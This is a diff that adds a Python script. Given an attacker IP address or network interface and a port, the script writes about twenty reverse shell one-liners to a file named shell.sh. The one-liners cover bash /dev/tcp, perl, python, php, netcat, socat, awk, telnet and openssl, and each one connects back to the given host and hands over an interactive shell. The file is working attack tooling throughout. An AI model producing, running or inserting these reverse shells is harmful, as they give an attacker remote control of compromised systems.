@@ -1,0 +1,74 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import sys
+import netifaces as ni
+import regex
+
+def is_ip(ip):
+    if regex.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip):
+        return True
+    return False
+
+
+def ip_from_interface(interface):
+    try:
+        ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+        return ip
+    except KeyError:
+        print(f"Error: Interface '{interface}' not found.")
+        sys.exit(1)
+
+def generate_shells(ip, port):
+    shells = [
+        f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+        f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
+        f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+        f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
+        f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+        f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+        f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        f"nc {ip} {port} -e /bin/sh",
+        f"ncat {ip} {port} -e /bin/sh",
+        f"socat TCP:{ip}:{port} EXEC:/bin/sh",
+        f"socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane",
+        f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{do{{printf \"shell> \" |& s; if((s |& getline c) <= 0) break; while ((c |& getline) > 0) print $0 |& s;}} while(0); close(s);}}}}'",
+        f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
+        f"/bin/sh -l > /dev/tcp/{ip}/{port} 0<&1 2>&1",
+        f"(sh -i >& /dev/tcp/{ip}/{port} 0>&1)",
+        f"setsid sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+        f"nohup sh -i >& /dev/tcp/{ip}/{port} 0>&1 &",
+        f"timeout 60 sh -i >& /dev/tcp/{ip}/{port} 0>&1",
+        f"openssl s_client -quiet -connect {ip}:{port} | /bin/sh | openssl s_client -quiet -connect {ip}:{port}"
+    ]
+    return shells
+
+def main():
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <IP/Interface> <PORT>")
+        sys.exit(1)
+
+    if is_ip(sys.argv[1]):
+        ip = sys.argv[1]
+    else:
+        ip = ip_from_interface(sys.argv[1])
+
+    port = sys.argv[2]
+
+    try:
+        int(port)
+    except ValueError:
+        print("Error: PORT must be an integer.")
+        sys.exit(1)
+
+    shells = generate_shells(ip, port)
+
+    with open("shell.sh", "w") as f:
+        for i, shell in enumerate(shells, 1):
+            f.write(f"# X - {i}\n{shell}\n\n")
+
+    print(f"all done => {ip}:{port} : shell.sh")
+
+
+if __name__ == "__main__":
+    main()
